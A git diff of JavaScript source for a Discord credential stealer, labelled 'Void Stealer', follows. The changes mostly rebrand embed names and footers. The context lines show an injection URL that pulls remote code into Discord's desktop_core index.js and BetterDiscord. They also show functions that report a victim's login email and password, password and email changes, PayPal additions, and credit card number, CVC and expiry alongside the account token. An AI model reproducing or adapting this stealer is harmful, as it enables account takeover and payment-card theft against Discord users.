@@ -11,9 +11,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Void', 
+  embed_name: 'Void Stealer', 
   embed_icon: 'https://cdn.discordapp.com/attachments/981957512016318524/984087621678534676/a650d11c296f2f76196c67dc5faabc84.png',
-  embed_color: 000000, 
+  embed_color: 000001, 
   injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
@@ -390,7 +390,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -650,7 +650,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Void',
+          text: 'BulkFA',
         },
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/981957512016318524/984087621678534676/a650d11c296f2f76196c67dc5faabc84.png',
@@ -695,7 +695,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Void',
+          text: 'Void Stealer',
         },
       },
     ],
@@ -737,7 +737,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Void',
+          text: 'Void Stealer',
         },
       },
     ],
@@ -779,7 +779,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Void',
+          text: 'Void Stealer',
         },
       },
     ],
@@ -821,7 +821,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Void',
+          text: 'Void Stealer',
         },
       },
     ],
@@ -865,7 +865,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Void',
+          text: 'Void Stealer',
         },
       },
     ],
